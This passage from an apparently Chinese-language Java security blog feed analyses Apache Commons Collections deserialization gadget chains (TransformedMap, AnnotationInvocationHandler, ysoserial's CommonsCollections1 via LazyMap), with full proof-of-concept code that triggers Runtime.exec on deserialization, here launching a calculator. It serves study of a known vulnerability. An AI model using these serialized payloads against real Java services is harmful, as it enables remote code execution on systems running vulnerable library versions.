class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">      <span class="comment">// 通过readObject方法进行反序列化</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections/image-20220913183349120.png" alt="image-20220913183349120"></p><p>相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成<code>Map</code>类型之后，通过<code>put()</code>、<code>putAll()</code>或者<code>setValue()</code>对<code>map</code>进行操作即可完成命令执行。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>前面的利用链仍需要服务端进行反序列化转换成<code>Map</code>对象，并进行赋值或者修改操作才可以触发命令执行。为了使得我们的攻击<code>payload</code>在服务端仅经过反序列化就可以触发，需要寻找新的利用点：<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>接下来我们看看<code>AnnotationInvocationHandler</code>类的源码，在构造函数中，传进的<code>Map</code>类型参数赋值给<code>memberValues</code><br><img src="/2022/11/10/CommonsCollections/image-20220914113429062.png" alt="image-20220914113429062"></p><p>在<code>readObject()</code>方法中，对<code>memberValues</code>进行遍历，最终当<code>var7</code>不为<code>null</code>时，通过<code>setValue()</code>进行修改操作，因此可以进入前面<code>TransformedMap</code>类中的<code>checkSetValue()</code>，触发命令执行<br><img src="/2022/11/10/CommonsCollections/image-20220914113611289.png" alt="image-20220914113611289"></p><p>POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            <span class="comment">// 设置方法访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">            <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            out.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections/image-20220914115903758.png" alt="image-20220914115903758"></p><p>这里需要注意<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>中的<code>key</code>必须为<code>value</code>。<strong>具体原因如下：</strong></p><p>在构造方法中我们传入的<code>Class</code>需要继承<code>Annotation</code>注解<br><img src="/2022/11/10/CommonsCollections/image-20221004170152670.png" alt="image-20221004170152670"></p><p>因此在 POC 里，我们构造攻击链的时候传入了 Java 标准库中的<code>Target.class</code>元注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></p><p>查看<code>@Target</code>元注解的源码，其中已经定义了参数元素为<code>value</code><br><img src="/2022/11/10/CommonsCollections/image-20221004170044091.png" alt="image-20221004170044091"></p><p>在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中，<code>var2 = AnnotationType.getInstance(this.type);</code>对<code>Target</code>元注解进行了处理，随后传到了<code>Map</code>类型参数<code>var3</code>中</p><p><img src="/2022/11/10/CommonsCollections/image-20220915000423127.png" alt="image-20220915000423127"></p><p>随后在<code>var6</code>中取得了我们前面设置的<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>的<code>key</code>，也就是<code>value</code>，接着在<code>var7</code>中获得的类<code>java.lang.annotation.ElementType</code>不为空满足<code>if</code>条件进入循环。</p><p>由此可得知，如果我们传入的是<code>@Target</code>元注解，我们构造的条件要满足：<code>map.put(&quot;value&quot;,xxxx);</code>才能进入<code>if</code>条件里触发命令执行。</p><p><strong>该条攻击利用链的限制</strong></p><p>JDK 版本需要在 8u71 之前（本文 JDK 版本为 8u60），在此之后的版本都无法触发命令执行，原因是<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法进行了修改，不再直接使用反序列化得到的<code>Map</code>进行操作，而是新建了一个<code>LinkedHashMap</code>对象。</p><p>后续相关操作都基于<code>LinkedHashMap</code>对象，而我们构造的<code>map</code>不再执行<code>put()</code>或者<code>setValue()</code>，因此无法触发命令执行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1利用链分析</title>
      <link href="/2022/11/10/CommonsCollections1/"/>
      <url>/2022/11/10/CommonsCollections1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections1利用链分析"><a href="#CommonsCollections1利用链分析" class="headerlink" title="CommonsCollections1利用链分析"></a>CommonsCollections1利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里开始学习分析<code>ysoserial</code>工具中的第一条<code>CommonsCollections</code>利用链，根据<code>payload</code>名称称呼为<code>CommonsCollections1</code><br><img src="/2022/11/10/CommonsCollections1/image-20220919220735401.png" alt="image-20220919220735401"></p><p>利用版本：CommonsCollections 3.1 - 3.2.1<br>限制：jdk 8u71 版本之前</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们先看一下<code>ysoserial</code>实现<code>CommonsCollections1</code>的关键源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到前面部分和我们在<a href="./01-Java安全基础/5-Java反序列化/1-CommonsCollections.md">《CommonsCollections链分析》</a>中构造的一样，不一样的是不再利用<code>transformedMap</code>类去调用<code>transform()</code>方法，而是使用了<code>LazyMap</code>中的方法，同时使用到了动态代理的知识。</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>这条链子既然选择使用<code>LazyMap</code>类，那必然是该类中也有调用<code>transform()</code>的方法，我们看一下<code>LazyMap</code>类的源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="built_in">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="built_in">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在<code>get()</code>方法中，检查<code>key</code>是否在<code>map</code>中，如果不存在就会调用<code>factory.transform()</code>方法生成<code>value</code>放进<code>map</code>中。我们从头跟起看看<code>factory</code>参数是什么内容。</p><p>POC 中从👇🏻开始进入<code>LazyMap</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></p><p>跟进<code>LazyMap</code>类的<code>decorate</code>方法，<code>return</code>到构造方法<code>LazyMap()</code>中，其中<code>factory</code>参数则是<code>ChainedTransformer</code>。<br><img src="/2022/11/10/CommonsCollections1/image-20220920215913812.png" alt="image-20220920215913812"></p><p>到这里发现没有调用到<code>LazyMap</code>中的<code>get()</code>方法，那么关键的<code>get()</code>方法在哪里调用的？<code>ysoserial</code>中的<code>gadget</code>已经给了我们答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在给出的<code>gadget</code>中，调用了<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法之后能进入<code>get()</code>方法中，源码如下：<br><img src="/2022/11/10/CommonsCollections1/image-20220920223014118.png" alt="image-20220920223014118"></p><p>接下来就是如何去调用到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，前辈们已经给出了解决方案就是使用动态代理的方式。</p><p>在前面 <a href="../../00-JavaSE/3-动态代理/动态代理.md">《动态代理》</a>章节我们已经学习过相关知识，这里写一个简单的 demo 回顾一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 